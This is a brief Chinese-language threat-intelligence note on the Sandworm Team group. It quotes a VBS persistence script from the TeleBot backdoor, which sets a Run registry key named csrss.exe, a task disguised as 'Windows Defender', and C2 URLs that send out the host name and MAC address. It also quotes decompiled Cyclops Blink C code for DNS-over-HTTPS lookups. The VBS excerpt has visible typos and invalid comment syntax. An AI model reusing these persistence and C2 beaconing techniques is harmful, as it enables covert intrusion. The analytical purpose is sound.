# Sandworm Team

## 特征

1. 为防止TeleBot后门被删除，该组织还附加了一个VBS脚本用来重新获取对目标主机的访问权限.

```vbs
?Dim version: version = "6.1.76.5"
'===================== WORK PARAMS =======
Dim timeout:timeout = 21  //每21分钟调用服务器
Dim bIP:bIP = "IP地址"  //C2服务器IP地址
'============= WORK PARAMS =========================
Dim sRequest:sRequest = ""
Dim taskName:taskName = "Windows Defender"
Dim arKey:arKey ="HKCU\Software\Microsoft\Windows\CurrentVersion\Run\csrss.exe"
//插入进程
'========================WORK PARAMS===========================
Dim pUlrl : pUrl = "https://" + bTP + "/services/nI-nl/power-bi-embedded/wt_mc_id/azuremktg_hp_powerbiembedded"
Dim sendUrl: sendUrl = "https://" + bIP + "/store/mseea/nl_NL/cat/Back-to-School/categoryID_68073200"
Dim htmlUrl:htmlUrl = "https://" + bIP + "/store/mseea/nl_NL/cat/Accessoires/categoryID_66233400?"
//将计算机名称和MAC地址发送到C2服务器
'================ WORK PARAMS =======================
```

2. Cyclops Blink恶意软件通过DNS over HTTPS执行DNS解析使用HTTPS下载文件.

```C
j_sprintf(
  vll,
  "PosT /dns-query HTTP/1.1\r\n"
  "Host: dns.google\r\n"
  "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0\r\n"
  "Accept: application/dns-message\r\n"
  "Content-Type: application/dns-message\r\n"
  "Content-Length: %d\r\n"
  "\r\n",
  v13);
v12=j_strlen(vll);
```
